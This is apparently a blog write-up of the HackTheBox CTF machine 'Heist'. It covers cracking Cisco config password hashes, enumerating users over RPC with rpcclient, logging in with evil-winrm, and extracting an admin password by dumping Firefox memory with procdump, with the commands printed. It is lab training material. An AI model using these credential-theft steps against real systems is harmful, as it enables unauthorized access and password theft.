---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-08-17-heist-hackthebox
tags:
- firefox
- forensics
- hackthebox
- procdump
- rpc
- windows
title: Heist @ HackTheBox
---

Heist is an "easy" machine on HackTheBox, involving some enumeration (especially rpc) and some forensics (dumping firefox memory).

## User Flag

Open Ports:

```
80/tcp  open  http
135/tcp open  msrpc
445/tcp open  microsoft-
5985/tcp open  wsman
```

On 80/443 is a website where we can click "login as guest", gather some potential usernames and download an attachment, a configuration file that contains a few secrets:

```
# usernames
hazard
rout3r
admin
# secrets & decrypted/decoded version
$1$pdQG$o8nrSzsGXeaduXrjlvKc91 : stealth1agent
0242114B0E143F015F5D1E161713 : $uperP@ssword
02375012182C1A1D751618034F36415408 : Q4)sJu\Y8qz*A3?d
```

We used this [website](https://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html) to decrypt the config passwords because they are not really sensitive and use john for the crypt passsword.

We can use `hazard:stealth1agent` to connect to msrpc and enumerate the other local users on the box:

```
rpcclient -U "hazard" heist.htb
rpcclient $> lookupnames hazard
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1009
S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK\support (1)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1012
S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\Chase (1)
```

We can now log into the box after some trial and error as "chase:Q4)sJu\\Y8qz\*A3?d" via the [evilwinrm](https://github.com/Hackplayers/evil-winrm) shell.

```
evil-winrm -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'
*Evil-WinRM* PS C:\Users\Chase\Documents>
```

The user flag is on the desktop of chase.

## Root Flag

One way to root the box is to recognize that firefox is running and then crash it. The admin password will now be in some recovery file in the profile folder:

```
# Go to AppData\Local\Mozilla\Firefox
Get-ChildItem -recurse | Get-Content | Select-String -pattern "login_password" 2>$null
```

I did not test this myself as I did not find a way to crash it – if you know how please tell me :)

Another way (the one I actually used) is to dump the process with [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) and then grep through the resulting memory dump:

```
upload procdump.exe
procdump.exe -accepteula -ma <pid>
Select-String -Path *.dmp -Pattern 'login_password' | out-host -paging
```

Either way we get the admin password , use it to connect via winrm and get the root flag.